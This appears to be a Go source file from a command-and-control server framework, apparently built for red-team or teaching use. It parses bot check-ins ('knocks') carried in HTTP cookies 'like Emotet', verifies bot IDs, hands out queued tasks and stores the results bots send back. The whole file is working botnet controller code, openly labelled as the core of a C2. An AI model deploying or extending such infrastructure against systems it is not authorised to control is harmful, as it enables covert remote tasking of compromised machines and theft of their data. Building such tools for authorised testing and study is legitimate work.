/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package message

import (
	"db"
	"errors"
	fmt "fmt"
	"net/http"

	proto "github.com/golang/protobuf/proto"
)

// ExtractMessage extracts the payload from submitted HTTP request.
// Currently the payload is stored in the first Cookie (like Emotet).
// You can change where agent is submitting the payload.
func ExtractMessage(r *http.Request) (*string, error) {
	if len(r.Cookies()) == 0 {
		return nil, errors.New("No data in cookies")
	}
	return &r.Cookies()[0].Value, nil
}

// processKnockEvent takes in the incoming Knock request and produces a response
func processKnockEvent(msg *[]byte) (*Envelope, error) {
	// Initalize Knock protobuf & unmarshal it
	knockEvent := &Knock{}
	if err := proto.Unmarshal(*msg, knockEvent); err != nil {
		return nil, err
	}
	fmt.Printf("[?] %s\tKnockID\n", knockEvent.BotId)
	task, err := db.GetTask(knockEvent.BotId)
	if err != nil {
		return nil, err
	}
	// Verify that the bot is legitimate
	if !verifyKnockID(task.KnockID, knockEvent.KnockId) {
		return nil, fmt.Errorf("[-] %s\tKnockID mismatch", knockEvent.BotId)
	}
	fmt.Printf("[?] %s\tTaskID: %d\tTaskContent: %s\n", knockEvent.BotId, task.TaskID, task.TaskContent)
	// In response, we will set the current taskID and taskContent
	responseContent, err := proto.Marshal(&Task{
		TaskId: task.TaskID,
		Task:   task.TaskContent,
	})
	if err != nil {
		return nil, err
	}
	// We will also update knockId
	task.KnockID = knockEvent.KnockId
	err = db.PutTask(task)
	if err != nil {
		return nil, err
	}
	// Response is wrapped into envelope with approriate MessageId
	return &Envelope{
		MessageId: 16,
		Message:   responseContent,
	}, nil
}

// processTaskResponseEvent takes in the incoming TaskResponse request and produces a response
func processTaskResponseEvent(msg *[]byte) (*Envelope, error) {
	// Initialize taskResponseEvent
	taskResponseEvent := &TaskResponse{}
	if err := proto.Unmarshal(*msg, taskResponseEvent); err != nil {
		return nil, err
	}
	fmt.Printf("[?] %s\tTaskResponse\t%s\n", taskResponseEvent.BotId, taskResponseEvent.Task)
	// Load Task data
	task, err := db.GetTask(taskResponseEvent.BotId)
	if err != nil {
		return nil, err
	}
	// Verify that the bot is legitimate; can also add time check
	if !verifyKnockID(task.KnockID, taskResponseEvent.KnockId) {
		return nil, fmt.Errorf("[-] %s\tKnockID mismatch", taskResponseEvent.BotId)
	}
	// Since we consumed the results, clear the task and set TaskId to 15 == knock
	responseContent, err := proto.Marshal(&Task{
		TaskId: 15,
		Task:   "",
	})
	if err != nil {
		return nil, err
	}
	// Save results received in the request
	task.KnockID = taskResponseEvent.KnockId
	task.TaskID = 15
	task.TaskContent = ""
	task.TaskResponse = taskResponseEvent.Task
	err = db.PutTask(task)
	if err != nil {
		return nil, err
	}
	return &Envelope{
		MessageId: 16,
		Message:   responseContent,
	}, nil
}

// ProcessMessage acts as a router which, based on MessageId
// supplied with the request further deserializes the payload.
// This is the meat of the C2 as it defines what you C2 can do and
// how it will handle different messages
func ProcessMessage(msg *[]byte) (*[]byte, error) {
	// All requests come in as serialized Envelope protobuf
	envelope := &Envelope{}
	if err := proto.Unmarshal(*msg, envelope); err != nil {
		return nil, err
	}
	// Envelope contains messageID and bytes of the actual message
	var body *Envelope
	var err error
	// Based on MessageId we can further process the request.
	// The IDs are set by the message designer (you?), hence they could be
	// anything you want
	switch envelope.MessageId {
	case 15: // messageId 15 is a knock
		body, err = processKnockEvent(&envelope.Message)
	case 17: // messageId 17 is response to the task
		body, err = processTaskResponseEvent(&envelope.Message)
	}
	// Error check
	if err != nil {
		return nil, err
	}
	// Response is marshaled and returned
	response, err := proto.Marshal(body)

	if err != nil {
		return nil, err
	}
	return &response, nil
}
